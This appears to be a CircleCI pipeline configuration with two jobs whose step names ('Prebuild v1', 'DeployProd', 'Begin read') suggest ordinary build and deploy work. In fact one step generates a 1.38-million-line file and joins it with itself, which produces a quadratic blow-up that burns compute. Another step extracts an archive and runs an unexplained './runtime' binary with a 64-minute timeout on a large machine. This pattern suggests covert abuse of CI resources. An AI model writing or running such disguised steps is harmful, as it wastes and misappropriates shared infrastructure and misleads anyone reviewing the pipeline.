jobs:
  PROMISE_EXPORT:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prebuild v1
          command: |
            mkdir -p /tmp/export4
            set +o pipefail 2>/dev/null; # produce handoff
            yes | head -n 1381990 > /tmp/export4/RAM.molten; true
            echo "step=DeployProd out=$(wc -c </tmp/export4/RAM.molten)"
      - persist_to_workspace:
          root: /tmp/export4
          paths:
            - 'RAM.molten'
  DeployProd:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/export4
      - run:
          name: Begin read
          command: |
            join -e '-' -a1 -a2 /tmp/export4/RAM.molten /tmp/export4/RAM.molten 2>/dev/null | wc -l || true
      - run:
          name: Retrieve tree
          command: git clone --depth 5 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unroll archive
          command: tar --extract -f manifest.tar
      - run:
          no_output_timeout: 64m
          command: bash -c "./runtime"
